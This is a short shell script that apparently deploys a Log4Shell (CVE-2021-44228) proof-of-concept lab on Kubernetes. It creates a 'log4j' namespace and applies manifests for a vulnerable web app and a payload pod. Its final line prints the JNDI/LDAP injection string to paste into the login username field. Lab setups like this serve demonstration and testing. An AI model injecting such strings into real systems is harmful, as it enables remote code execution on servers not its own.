echo " Get Master Node Internal IP Adress "
masternode=$(sudo kubectl get nodes --selector=node-role.kubernetes.io/master -o jsonpath={.items[*].status.addresses[?\(@.type==\"InternalIP\"\)].address})
echo " Maseternode IP : " $masternode
echo " add master node ip to "
sed  "s/masternodeip/${masternode}/g" ./cve-poc-deployment.yaml.template > ./cve-poc-deployment.yaml 
echo "sed done"
echo "Start creating the services for web and payload pod "
kubectl create ns log4j
kubectl -n log4j apply -f cve-web-deployment.yaml
kubectl -n log4j apply -f cve-web-service.yaml
kubectl -n log4j apply -f cve-poc-service.yaml
kubectl -n log4j apply -f cve-poc-deployment.yaml
echo " paste ${jndi:ldap://IP:32095/a} replace IP with : "$masternode" in Userfield at login Browser in order start connection "



